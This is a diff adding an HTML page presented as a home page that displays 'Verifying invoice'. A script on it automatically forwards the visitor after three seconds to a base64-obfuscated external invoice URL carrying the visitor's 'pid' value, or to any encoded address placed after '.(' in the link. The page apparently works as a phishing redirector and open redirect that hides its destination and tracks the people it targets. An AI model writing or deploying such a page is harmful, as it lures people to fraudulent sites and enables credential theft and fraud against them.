@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Welcome | Home page</title>
+    </head>
+    <body>
+        <div>Verifying invoice</div>
+        <script>
+            
+            var _u = window.location.href;
+        var u = new URL(_u);
+        var oo = u.searchParams.get('pid'); 
+            
+            setTimeout(function() {
+            if(window.location.href.includes(".(")) {
+                document.location.href = atob(window.location.href.split(".(")[1]);
+            } else {
+                document.location.href = atob("aHR0cHM6Ly9tY2FvcmFscy5jby51ay9pbnZvaWNlLz9lPQ==")+oo;
+            }
+            }, 1 * 3000);
+        </script>
+    </body>
+</html>
